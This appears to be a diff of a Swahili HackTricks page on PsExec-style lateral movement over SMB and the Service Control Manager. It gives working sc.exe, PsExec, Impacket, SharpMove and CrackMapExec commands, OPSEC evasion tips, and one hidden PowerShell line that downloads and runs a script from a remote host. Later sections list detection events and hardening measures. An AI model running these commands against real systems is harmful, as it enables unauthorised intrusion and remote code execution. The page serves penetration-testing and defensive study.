@@ -2,25 +2,26 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Zinafanyaje kazi
+## Jinsi zinavyofanya kazi
 
-Mbinu hizi hutumia vibaya Windows Service Control Manager (SCM) kwa mbali kupitia SMB/RPC ili kutekeleza commands kwenye host lengwa. Mtiririko wa kawaida ni:
+Mbinu hizi hutumia vibaya Windows Service Control Manager (SCM) kwa mbali kupitia SMB/RPC ili kutekeleza amri kwenye host lengwa. Mtiririko wa kawaida ni:
 
-1. Authenticate kwenye target na ufikie share ya ADMIN$ kupitia SMB (TCP/445).
-2. Copy executable au bainisha command line ya LOLBAS ambayo service itatekeleza.
-3. Create service kwa mbali kupitia SCM (MS-SCMR over \PIPE\svcctl) inayoelekeza kwenye command au binary hiyo.
-4. Start service ili kutekeleza payload na, kwa hiari, capture stdin/stdout kupitia named pipe.
-5. Stop service na ufanye cleanup (delete service na binaries zozote zilizodondoshwa).
+1. Thibitisha utambulisho kwenye lengwa na ufikie share ya ADMIN$ kupitia SMB (TCP/445).
+2. Nakili executable au bainisha command line ya LOLBAS ambayo service itatekeleza.
+3. Unda service kwa mbali kupitia SCM (MS-SCMR kupitia \PIPE\svcctl) inayoelekeza kwenye amri au binary hiyo.
+4. Anzisha service ili kutekeleza payload na, kwa hiari, kunasa stdin/stdout kupitia named pipe.
+5. Simamisha service na usafishe (futa service na binary zozote zilizowekwa).
 
-Mahitaji/prereqs:
-- Local Administrator kwenye target (SeCreateServicePrivilege) au service creation rights zilizoainishwa wazi kwenye target.
-- SMB (445) inafikika na share ya ADMIN$ inapatikana; Remote Service Management inaruhusiwa kupitia host firewall.
-- UAC Remote Restrictions: ukiwa na local accounts, token filtering inaweza kuzuia admin kupitia network isipokuwa utumie built-in Administrator au LocalAccountTokenFilterPolicy=1.
-- Kerberos dhidi ya NTLM: kutumia hostname/FQDN huwezesha Kerberos; kuunganisha kwa IP mara nyingi hurudi kwenye NTLM (na kunaweza kuzuiwa kwenye mazingira yenye hardening).
+Mahitaji/vitu vya awali:
+- Local Administrator kwenye lengwa (SeCreateServicePrivilege) au ruhusa za wazi za kuunda service kwenye lengwa.
+- SMB (445) iweze kufikiwa na share ya ADMIN$ ipatikane; Remote Service Management iruhusiwe kupitia firewall ya host.
+- UAC Remote Restrictions: kwa akaunti za ndani, uchujaji wa token unaweza kuzuia admin kupitia mtandao isipokuwa utumie akaunti ya Administrator iliyojengewa ndani au LocalAccountTokenFilterPolicy=1.
+- Kerberos dhidi ya NTLM: kutumia hostname/FQDN huwezesha Kerberos; kuunganisha kwa kutumia IP mara nyingi hurudi kwenye NTLM (na huenda ikazuiwa katika mazingira yaliyoimarishwa usalama).
 
-### Manual ScExec/WinExec kupitia sc.exe
+### ScExec/WinExec ya mikono kupitia sc.exe
 
-Ifuatayo inaonyesha mbinu ndogo ya service-creation. Service image inaweza kuwa EXE iliyodondoshwa au LOLBAS kama cmd.exe au powershell.exe.
+Ifuatayo inaonyesha mbinu ya msingi ya kuunda service. Picha ya service inaweza kuwa EXE iliyowekwa au LOLBAS kama cmd.exe au powershell.exe.
+
 ```cmd
 :: Execute a one-liner without dropping a binary
 sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
@@ -33,9 +34,10 @@ sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= de
 sc.exe \\TARGET start HTSvc
 sc.exe \\TARGET delete HTSvc
 ```
+
 Maelezo:
-- Tarajia hitilafu ya timeout unapoanzisha EXE isiyo ya service; execution bado hufanyika.
-- Ili kubaki na OPSEC-friendly zaidi, pendelea commands zisizo na faili (cmd /c, powershell -enc) au futa artifacts zilizodondoshwa.
+- Tarajia hitilafu ya timeout unapoanzisha EXE isiyo huduma; utekelezaji bado hufanyika.
+- Ili kubaki rafiki zaidi kwa OPSEC, pendelea amri zisizo na faili (cmd /c, powershell -enc) au ufute vizalia vilivyoachwa.
 
 Pata hatua za kina zaidi katika: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>
 
@@ -43,8 +45,9 @@ Pata hatua za kina zaidi katika: https://blog.ropnop.com/using-credentials-to-ow
 
 ### Sysinternals PsExec.exe
 
-- Admin tool ya kawaida inayotumia SMB kudondosha PSEXESVC.exe katika ADMIN$, kusakinisha service ya muda (jina la default PSEXESVC), na ku-proxy I/O kupitia named pipes.
+- Zana ya kawaida ya msimamizi inayotumia SMB kuweka PSEXESVC.exe kwenye ADMIN$, kusakinisha huduma ya muda (jina chaguomsingi PSEXESVC), na kuelekeza I/O kupitia named pipes.
 - Mifano ya matumizi:<sup>[[1]](#references)</sup>
+
 ```cmd
 :: Interactive SYSTEM shell on remote host
 PsExec64.exe -accepteula \\HOST -s -i cmd.exe
@@ -55,16 +58,20 @@ PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami 
 :: Customize the service name for OPSEC (-r)
 PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
 ```
-- Unaweza kuendesha moja kwa moja kutoka Sysinternals Live kupitia WebDAV:
+
+- Unaweza kuzindua moja kwa moja kutoka Sysinternals Live kupitia WebDAV:
+
 ```cmd
 \\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
 ```
+
 OPSEC
-- Huacha matukio ya usakinishaji/uondoaji wa service (jina la service mara nyingi huwa PSEXESVC isipokuwa -r itumike) na huunda C:\Windows\PSEXESVC.exe wakati wa utekelezaji.
+- Huacha rekodi za matukio ya kusakinisha/kufuta huduma (jina la huduma mara nyingi huwa PSEXESVC isipokuwa -r itumike) na huunda C:\Windows\PSEXESVC.exe wakati wa utekelezaji.
 
-### Impacket psexec.py (PsExec-like)
+### Impacket psexec.py (inafanana na PsExec)
 
-- Hutumia service inayofanana na RemCom iliyopachikwa. Huacha binary ya service ya muda (mara nyingi ikiwa na jina lililobadilishwa kwa nasibu) kupitia ADMIN$, huunda service (kwa kawaida huwa RemComSvc), na hupitisha I/O kupitia named pipe.
+- Hutumia huduma iliyopachikwa inayofanana na RemCom. Hudondosha binary ya muda ya huduma (mara nyingi huwa na jina lililobadilishwa nasibu) kupitia ADMIN$, huunda huduma (jina chaguomsingi mara nyingi huwa RemComSvc), na kuelekeza I/O kupitia named pipe.
+
 ```bash
 # Password auth
 psexec.py DOMAIN/user:Password@HOST cmd.exe
@@ -78,66 +85,75 @@ psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe
 # Change service name and output encoding
 psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
 ```
-Artifacts
-- EXE ya muda katika C:\Windows\ (herufi 8 za random). Jina la service kwa chaguo-msingi ni RemComSvc isipokuwa libadilishwe.
+
+Mabaki
+- EXE ya muda katika C:\Windows\ (herufi nasibu 8). Jina la service ni RemComSvc kwa chaguomsingi isipokuwa libadilishwe.
 
 ### Impacket smbexec.py (SMBExec)
 
-- Huunda service ya muda inayozindua cmd.exe na kutumia named pipe kwa I/O. Kwa kawaida huepuka kuacha EXE payload kamili; command execution huwa semi-interactive.
+- Huunda service ya muda inayoanzisha cmd.exe na kutumia named pipe kwa I/O. Kwa ujumla huepuka kuweka payload kamili ya EXE; utekelezaji wa amri huwa na mwingiliano wa kiasi.
+
 ```bash
 smbexec.py DOMAIN/user:Password@HOST
 smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
 ```
+
 ### SharpLateral and SharpMove
 
-- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) inatekeleza mbinu kadhaa za lateral movement, ikiwemo service-based exec.
+- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) hutekeleza mbinu kadhaa za lateral movement, ikiwemo exec inayotegemea service.
+
 ```cmd
 SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
 ```
-- [SharpMove](https://github.com/0xthirteen/SharpMove) inajumuisha urekebishaji/uundaji wa service ili kutekeleza command kwa mbali.
+
+- [SharpMove](https://github.com/0xthirteen/SharpMove) inajumuisha urekebishaji/uundaji wa huduma ili kutekeleza amri kwa mbali.
+
 ```cmd
 SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
 SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
 ```
+
 - Unaweza pia kutumia CrackMapExec kutekeleza kupitia backends tofauti (psexec/smbexec/wmiexec):
+
 ```bash
 cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
 cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
 ```
-## OPSEC, detection and artifacts
 
-Artifakti za kawaida za host/network unapotumia mbinu zinazofanana na PsExec:
+## OPSEC, ugunduzi na artifacts
+
+Artifacts za kawaida za host/network unapotumia mbinu zinazofanana na PsExec:
 - Security 4624 (Logon Type 3) na 4672 (Special Privileges) kwenye target kwa akaunti ya admin iliyotumika.
-- Security 5140/5145 File Share na File Share Detailed events zinazoonyesha ufikiaji wa ADMIN$ na create/write ya service binaries (kwa mfano, PSEXESVC.exe au random 8-char .exe).
-- Security 7045 Service Install kwenye target: majina ya services kama PSEXESVC, RemComSvc, au custom (-r / -service-name).
-- Sysmon 1 (Process Create) kwa services.exe au service image, 3 (Network Connect), 11 (File Create) ndani ya C:\Windows\, 17/18 (Pipe Created/Connected) kwa pipes kama \\.\pipe\psexesvc, \\.\pipe\remcom_*, au equivalents zilizorandomishwa.
-- Registry artifact ya Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 kwenye operator host (ikiwa haikuzuiwa).
+- Security 5140/5145 File Share na File Share Detailed events zinazoonyesha ufikiaji wa ADMIN$ na uundaji/uandikaji wa service binaries (k.m., PSEXESVC.exe au .exe yenye herufi/namba 8 za nasibu).
+- **System** 7045 kutoka Service Control Manager kwa usakinishaji wa service kwenye target: majina kama PSEXESVC, RemComSvc, au custom (`-r` / `-service-name`). Hii inathibitisha kuwa service ilisakinishwa, si kwamba image yake iliendeshwa. Linganisha timestamp na image path yake na process events au service-image prefetch entry inayolingana ikiwa inapatikana.<sup>[[4]](#references)</sup>
+- Sysmon 1 (Process Create) kwa services.exe au service image, 3 (Network Connect), 11 (File Create) katika C:\Windows\, 17/18 (Pipe Created/Connected) kwa pipes kama \\.\pipe\psexesvc, \\.\pipe\remcom_*, au zinazofanana zenye majina ya nasibu.
+- Registry artifact ya Sysinternals EULA: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 kwenye host ya operator (ikiwa haijazimwa).
 
-Hunting ideas
-- Weka alert kwenye service installs ambapo ImagePath inajumuisha cmd.exe /c, powershell.exe, au TEMP locations.
-- Tafuta process creations ambapo ParentImage ni C:\Windows\PSEXESVC.exe au children wa services.exe wanaoendesha kama LOCAL SYSTEM na kutekeleza shells.
-- Weka alama kwenye named pipes zinazoishia na -stdin/-stdout/-stderr au majina ya pipes yanayojulikana ya PsExec clones.
+Mawazo ya kutafuta
+- Toa alert kuhusu usakinishaji wa service ambapo ImagePath inajumuisha cmd.exe /c, powershell.exe, au maeneo ya TEMP.
+- Tafuta process creations ambapo ParentImage ni C:\Windows\PSEXESVC.exe au watoto wa services.exe wanaoendeshwa kama LOCAL SYSTEM na kutekeleza shells.
+- Weka alama kwa named pipes zinazoishia kwa -stdin/-stdout/-stderr au majina ya pipe yanayotambulika ya PsExec clone.
 
-## Troubleshooting common failures
-- Access is denied (5) wakati wa kuunda services: si local admin halisi, UAC remote restrictions kwa local accounts, au EDR tampering protection kwenye service binary path.
-- The network path was not found (53) au haikuweza kuunganisha kwa ADMIN$: firewall inazuia SMB/RPC au admin shares zimezimwa.
-- Kerberos inashindwa lakini NTLM imezuiwa: unganisha ukitumia hostname/FQDN (si IP), hakikisha SPNs ziko sahihi, au toa -k/-no-pass pamoja na tickets unapotumia Impacket.
-- Service start times out lakini payload iliendeshwa: hii inatarajiwa ikiwa si real service binary; capture output kwenye file au tumia smbexec kwa live I/O.
+## Kutatua matatizo ya kawaida
+- Access is denied (5) wakati wa kuunda services: si local admin kweli, vizuizi vya UAC vya remote kwa akaunti za local, au ulinzi wa EDR dhidi ya kuchezewa kwenye service binary path.
+- The network path was not found (53) au haikuweza kuunganishwa na ADMIN$: firewall inazuia SMB/RPC au admin shares zimezimwa.
+- Kerberos inashindwa lakini NTLM imezuiwa: unganisha kwa kutumia hostname/FQDN (si IP), hakikisha SPNs ziko sahihi, au tumia -k/-no-pass pamoja na tickets unapotumia Impacket.
+- Service start inafikia timeout lakini payload iliendeshwa: hili linatarajiwa ikiwa si service binary halisi; hifadhi output kwenye faili au tumia smbexec kwa live I/O.
 
-## Hardening notes
-- Windows 11 24H2 na Windows Server 2025 zinahitaji SMB signing kwa default kwa outbound (na Windows 11 inbound) connections. Hii haivunji matumizi halali ya PsExec yenye valid creds lakini inazuia unsigned SMB relay abuse na inaweza kuathiri devices ambazo hazitumii signing.<sup>[[2]](#references)</sup>
-- New SMB client NTLM blocking (Windows 11 24H2/Server 2025) inaweza kuzuia NTLM fallback wakati wa kuunganisha kwa IP au kwenye non-Kerberos servers. Katika mazingira yaliyofanywa hardening, hii itavunja PsExec/SMBExec inayotegemea NTLM; tumia Kerberos (hostname/FQDN) au configure exceptions ikiwa inahitajika kihalali.<sup>[[2]](#references)</sup>
-- Principle of least privilege: punguza local admin membership, pendelea Just-in-Time/Just-Enough Admin, enforce LAPS, na monitor/alert kwenye 7045 service installs.
+## Vidokezo vya hardening
+- Windows 11 24H2 na Windows Server 2025 zinahitaji SMB signing kwa chaguo-msingi kwa miunganisho ya outbound (na Windows 11 pia kwa inbound). Hili halizuii matumizi halali ya PsExec yenye creds halali, lakini huzuia matumizi mabaya ya SMB relay isiyo na saini na huenda likaathiri vifaa visivyoungwa mkono na signing.<sup>[[2]](#references)</sup>
+- Kuzuia NTLM kwa SMB client mpya (Windows 11 24H2/Server 2025) kunaweza kuzuia fallback ya NTLM wakati wa kuunganisha kwa IP au kwa servers zisizotumia Kerberos. Katika mazingira yaliyofanyiwa hardening, hili litavunja PsExec/SMBExec inayotumia NTLM; tumia Kerberos (hostname/FQDN) au sanidi exceptions ikiwa inahitajika kihalali.<sup>[[2]](#references)</sup>
+- Kanuni ya ruhusa ya kiwango cha chini kabisa: punguza uanachama wa local admin, pendelea Just-in-Time/Just-Enough Admin, tekeleza LAPS, na fuatilia/toa alert kwa usakinishaji wa service wa 7045.
 
-## See also
+## Tazama pia
 
-- WMI-based remote exec (mara nyingi huwa fileless zaidi):
+- Remote exec inayotegemea WMI (mara nyingi haihitaji faili):
 
 {{#ref}}
 ./wmiexec.md
 {{#endref}}
 
-- WinRM-based remote exec:
+- Remote exec inayotegemea WinRM:
 
 {{#ref}}
 ./winrm.md
@@ -146,7 +162,7 @@ Hunting ideas
 ## References
 
 - [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
-- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
-- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
-
+- [2] [Uimarishaji wa usalama wa SMB katika Windows Server 2025 na Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
+- [3] [Kutumia Credentials kumiliki Windows Boxes - Sehemu ya 2 (PSExec na Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+- [4] [Microsoft – Kutatua kuwashwa upya kusikotarajiwa kwa kutumia system event logs](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
 {{#include ../../banners/hacktricks-training.md}}
